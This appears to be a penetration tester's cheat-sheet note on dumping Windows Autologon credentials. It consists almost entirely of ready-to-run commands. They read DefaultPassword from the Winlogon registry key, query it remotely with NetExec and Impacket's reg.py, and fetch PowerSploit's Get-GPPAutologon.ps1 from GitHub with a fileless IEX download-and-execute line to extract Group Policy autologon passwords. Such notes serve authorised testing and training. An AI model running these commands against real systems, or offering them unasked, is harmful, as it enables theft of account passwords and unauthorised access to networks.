---
Primary_category: "[[WINDOWS CREDENTIALS DUMPING]]"
title: "WINDOWS AUTOLOGON"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WINDOWS CREDENTIALS DUMPING]]

#### *Abuse - Windows (Local)*

##### *Get-ItemProperty*

> ***Locally***

> ***[Get-ItemProperty](https://learn.microsoft.com/es-es/powershell/module/microsoft.powershell.management/get-itemproperty?view=powershell-7.5)***

```powershell
Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon' | Select DefaultDomainName, DefaultUsername, DefaultPassword | fl
```

---

#### *Abuse - UNIX-like*

> ***Autologon must be configured via Group Policy instead of locally***

##### *Netexec*

> ***[Netexec](https://github.com/Pennyw0rth/NetExec)***

```bash
nxc smb '<TARGET>' --username '<USER>' --password '<PASSWD>' --module 'gpp_autologin'
```

##### *Impacket's REG.py*

> ***[Reg.py]()***

```bash
reg.py query -keyName "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" '<DOMAIN>/<USER>:<PASSWD>@<TARGET>'
```

---

#### *Abuse - Windows*

> ***Autologon must be configured via Group Policy instead of locally***

##### *Get-GPPAutologon.ps1*

> ***[Get-GPPAutologon.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1)***

###### *Usage*

- ***Fileless***

```powershell
IEX (New-Object Net.WebClient).downloadString('https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/master/Exfiltration/Get-GPPAutologon.ps1')
```

- ***Touching Disk***

```powershell
IWR -UseBasicParsing -Uri 'https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/master/Exfiltration/Get-GPPAutologon.ps1' -OutFile '.\Get-GPPAutologon.ps1'
```

```powershell
Import-Module '.\Get-GPPAutologon.ps1'
```

###### *Usage*

```powershell
Get-GPPAutologon | ForEach-Object {$_.passwords} | Sort-Object -Uniq
```